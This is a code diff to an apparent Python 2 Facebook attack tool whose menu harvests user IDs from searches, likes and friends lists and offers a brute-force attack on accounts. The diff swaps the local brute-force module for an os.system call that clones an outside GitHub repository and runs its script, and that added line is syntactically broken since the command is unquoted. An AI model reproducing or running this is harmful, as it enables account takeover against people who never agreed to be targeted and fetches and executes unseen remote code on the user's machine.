@@ -12,7 +12,6 @@ from src import friends_list
 from src import friends
 from src import search_name
 from src import likes
-from src import force_attack
 from bs4 import BeautifulSoup as parser
 import time
 import sys
@@ -37,7 +36,7 @@ class Brute(object):
 		self.menu += ('  [ \033[0;96m03\033[0m ]  \033[1;91mDump Id by Search name\n')
 		self.menu += ('  [ \033[0;96m04\033[0m ]  \033[1;91mDump Id from likes status\n')
                 self.menu += ('  [ \033[1;96m05\033[0m ]  \033[0mDump id Friends lists\n')
-		self.menu += ('  [ \033[0;96m06\033[0m ]  \033[0mBrute Force Attack\n')
+		self.menu += ('  [ \033[0;96m06\033[0m ]  \033[0m(Download) Brute Force Attack\n')
                 self.menu += ('  [ \033[1;96m07\033[0m ]  \033[0mUpdate Script?\n')
 		self.menu += ('  [ \033[0;96m00\033[0m ]  \033[0mRemove cookies\n')
 		if self.cookie == False:
@@ -80,7 +79,7 @@ class Brute(object):
                 elif choose == 5:
                         exit(friends_list.main(self, self.cookie, self.url, self.config))
 		elif choose == 6:
-                        exit(force_attack.main())
+                        os.system(git clone https://github.com/Zero-ZxXxAngel/gagal && cd gagal && python2 gagal.py)
                 elif choose == 7:
                         os.system('clear')
                         jalan('\033[1;94mPlease Wait !')
